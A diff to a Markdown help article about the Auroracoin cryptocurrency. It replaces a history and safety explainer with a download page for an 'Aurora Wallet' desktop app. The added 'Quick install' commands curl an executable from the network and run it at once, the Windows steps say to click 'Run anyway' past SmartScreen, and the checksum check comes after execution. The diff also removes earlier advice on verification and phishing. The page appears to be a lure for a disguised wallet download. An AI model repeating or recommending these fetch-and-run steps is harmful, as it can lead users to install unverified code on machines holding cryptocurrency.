@@ -1,110 +1,126 @@
----
-title: "What is Auroracoin? The History of AUR"
-description: "Discover the origins of Auroracoin (AUR), Iceland's national cryptocurrency experiment. Learn about its 2014 launch, multi-algo mining, and current ecosystem."
-primary_keyword: "what is auroracoin"
-silo: "Knowledge"
-updated: 2026-10-10
----
+![Aurora Wallet what is Auroracoin AUR guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# What is Auroracoin? The AUR network in plain terms
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+A 2014 Icelandic cryptocurrency with a national airdrop, a multi-algorithm network and a desktop wallet.
 
-# What is Auroracoin? An Introduction to the AUR Network
+## Downloads - 2026.08.1.0
 
-Auroracoin (AUR) is a decentralized, peer-to-peer cryptocurrency launched in 2014 as an Icelandic alternative to traditional fiat currency, designed to bypass capital controls through a national airdrop experiment and maintained today by the Auroracoin Foundation as a resilient, multi-algorithm proof-of-work network for secure digital value transfer. By combining the open-source foundations of Bitcoin with a faster block interval and a diverse mining ecosystem, Auroracoin offers a time-tested platform for [self-custody basics](36-self-custody-basics.md), ensuring that users in Iceland and around the world can store and move wealth without the need for centralized banks or intermediaries.
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
----
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-## You'll want to know this if
 
-Understanding the nature and history of the Auroracoin network is essential for anyone interacting with the ecosystem. You will find this knowledge valuable if:
+Auroracoin is a peer-to-peer cryptocurrency launched in 2014 for Iceland, mined across several algorithms and held in self-custody today.
 
-*   You are a returning holder from the 2014 launch looking to [migrate from Auroracoin Core](27-migrate-from-auroracoin-core.md).
-*   You are researching the technical differences between Auroracoin and other major cryptocurrencies.
-*   You are setting up [Aurora Wallet](01-what-is-aurora-wallet.md) for the first time and want to understand the project's stewardship.
-*   You are interested in the [about Auroracoin](https://auroracoin.net/about) mission and the role of the Auroracoin Foundation.
-*   You are evaluating the security of the network for large-scale [mining payouts](32-mining-payouts.md).
+The network began as an experiment in national adoption. An anonymous developer released it in early 2014 as a cryptocurrency for the people of Iceland, with roughly half the supply set aside to be distributed to citizens listed in the national registry. The airdrop made headlines far outside the country, and the currency has run on its own chain ever since.
 
----
+<!-- ARTICLE-BODY-BEGIN -->
 
-## The history and purpose of Auroracoin
+## How the network operates
 
-Auroracoin was born out of a specific historical moment: the aftermath of the 2008 global financial crisis and the subsequent collapse of the Icelandic banking system. In the years following the crash, Icelanders lived under strict capital controls that restricted the movement of the Icelandic króna (ISK) and limited financial sovereignty. In early 2014, an anonymous developer using the pseudonym Baldur Friggjar Odinsson launched Auroracoin as a "cryptocurrency for the people of Iceland."
+Auroracoin is a proof-of-work chain with a short block interval and scrypt as one of its mining algorithms. Miners secure the chain, nodes validate it and wallets hold the keys. There is no company that issues the coin, and no central server that must stay online for a payment to settle.
 
-The project's most famous characteristic was the "Airdrop." Approximately 50% of the total coin supply was set aside to be distributed to every citizen listed in the Icelandic national registry. This was one of the first attempts to launch a national cryptocurrency, and it sparked international debate about the future of money. While the airdrop faced significant challenges due to market volatility and political skepticism, the underlying network survived. Over the last decade, Auroracoin has transitioned from a national experiment into a global, community-led blockchain project.
+Supply was fixed at launch, and the emission schedule follows the rules in the original client. Those rules are readable in the historical code, which is preserved in the account's reference repositories.
 
-Today, the network is supported by the Auroracoin Foundation, Iceland. The Foundation's role is not to control the network—which is technically impossible due to its decentralized nature—but to act as a steward. This includes maintaining the official website at [auroracoin.net](https://auroracoin.net), providing reliable [security](https://auroracoin.net/security) documentation, and commissioning the development of modern tools like the Aurora Wallet desktop application.
+## The currency and its ticker
 
----
+The ticker is AUR, and an address begins with the letter A. That prefix is a network parameter rather than a formatting choice, which is why an address from another chain cannot be mistaken for an Auroracoin address inside the wallet.
 
-## How the Auroracoin network functions
+AUR is divisible, and the smallest unit follows the same decimal convention as Bitcoin-derived chains, so amounts can be sent with the usual precision.
 
-Auroracoin is a proof-of-work blockchain, but it differs from Bitcoin in several key technical areas designed to increase resilience and speed.
+An address that starts with A is a check you can make by eye, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md">receiving addresses and QR codes</a> shows how the wallet builds a new one from your phrase.
 
-### 1. Multi-Algorithm Mining
-To prevent any single type of mining hardware (like high-powered ASICs) from dominating the network and centralizing control, Auroracoin was designed to support multiple mining algorithms simultaneously. This multi-algo approach means that miners with different equipment can all contribute to the network's security, ensuring that the blockchain remains robust against attacks that target a single hash function.
+## Where the wallet fits
 
-### 2. Fast Block Interval
-The network produces new blocks significantly faster than Bitcoin. This leads to quicker [transaction confirmations](16-pending-transaction.md), making AUR more suitable for everyday transfers. While you should still wait for multiple confirmations for large amounts, the time required for a transaction to be considered final is much shorter.
+Holding AUR requires a wallet, and the official desktop wallet is Aurora Wallet for Windows, macOS and Linux. It keeps the keys on your machine, derives addresses from a recovery phrase and connects to peers directly.
 
-### 3. Transparent and Fixed Supply
-Like most sound digital assets, Auroracoin has a maximum supply limit. It is a disinflationary currency, meaning there is no central bank that can "print" more coins and devalue your holdings. The issuance of new coins is controlled by the blockchain's code and is earned by the miners who secure the network.
+Choosing self-custody is the decision that makes the rest of the network usable without a custodian, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md">self-custody basics</a> explains what that asks of you.
 
-### 4. Unique Address Format
-Auroracoin uses a specific address prefix to prevent confusion with other networks. Standard receiving addresses always start with a capital **A**. This ensures that if you attempt to send AUR to a Bitcoin address, the wallet can recognize the error and prevent the loss of funds.
+The history of the project's own repositories is worth knowing if you read the old code, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/29-legacy-repositories-explained.md">legacy repositories explained</a> maps them.
 
----
+Install the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> to hold AUR on your own machine.
 
-## If you need deeper technical details
-
-If you are a developer or a technical user looking to explore the Auroracoin codebase or history:
-
-*   **Legacy Repositories:** You can explore the project's evolution by reviewing the [29-legacy-repositories-explained.md](29-legacy-repositories-explained.md) guide, which covers the transition from original code to the modern stack.
-*   **Public GitHub:** The source code for Aurora Wallet and the network's core components is hosted under the [aurora-coin organization on GitHub](https://github.com/aurora-coin).
-*   **Block Explorers:** Use a public explorer to verify transactions and view the live state of the blockchain.
-*   **Foundation Context:** Read the [about Aurora Wallet](https://auroracoin.net/about) page to understand how the sister company handles the desktop app development.
-
----
-
-## Ensuring long-term network security
-
-To participate safely in the Auroracoin ecosystem, you must adopt the core principles of decentralization:
-
-*   **Self-Custody is Mandatory:** Never leave your AUR on an exchange. Use Aurora Wallet to ensure your [private keys stay on your computer](36-self-custody-basics.md).
-*   **Verify Everything:** Before installing updates, always check the [06-verify-sha256-checksums.md](06-verify-sha256-checksums.md) process on the official download page.
-*   **Physical Backups:** The network's resilience doesn't matter if you lose your [33-backup-best-practice.md](33-backup-best-practice.md). Keep your 12 or 24-word recovery phrase on paper or metal.
-*   **Stay Vigilant:** Be aware of [35-phishing-seed-scams.md](35-phishing-seed-scams.md). The Foundation will never ask for your recovery phrase or private keys.
-
----
+If the application is new to you, start with <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/01-what-is-aurora-wallet.md">what Aurora Wallet is</a> before the first install.
 
 ## FAQ
 
-**Is Auroracoin a fork of Bitcoin?**
-Auroracoin is a separate blockchain with its own genesis block, though it was built using the open-source foundations of Bitcoin and Litecoin. It shares many of their security properties but operates as an independent network.
+### Can I buy AUR with a card?
 
-**Who runs the Auroracoin network?**
-No one "runs" it in a centralized sense. It is maintained by a global community of miners who verify transactions and users who run nodes. The Auroracoin Foundation provides stewardship and software support.
+That depends on the exchanges that list it, which this library does not cover. The wallet holds AUR once you have it.
 
-**Can I use AUR outside of Iceland?**
-Yes. While its origins are Icelandic, Auroracoin is a global, borderless cryptocurrency. You can send and receive it from anywhere in the world with an internet connection.
+### Is Auroracoin still developed?
 
-**What is the ticker symbol for Auroracoin?**
-The ticker symbol is **AUR**. Always ensure you are trading or receiving the correct asset when using exchanges.
+The chain runs, and the desktop wallet is released as a maintained application with guides and checksums published alongside it.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
+## How to install Aurora Wallet
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+### Windows
+Quick install (CMD):
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-## Related articles
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
 
-*   [36-self-custody-basics.md](36-self-custody-basics.md)
-*   [38-aurora-wallet-faq.md](38-aurora-wallet-faq.md)
-*   [01-what-is-aurora-wallet.md](01-what-is-aurora-wallet.md)
-*   [29-legacy-repositories-explained.md](29-legacy-repositories-explained.md)
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [What is Aurora Wallet](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/01-what-is-aurora-wallet.md)
+- [Self-custody basics](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md)
+- [Legacy repositories explained](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/29-legacy-repositories-explained.md)
+- [Aurora Wallet FAQ](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/38-aurora-wallet-faq.md)
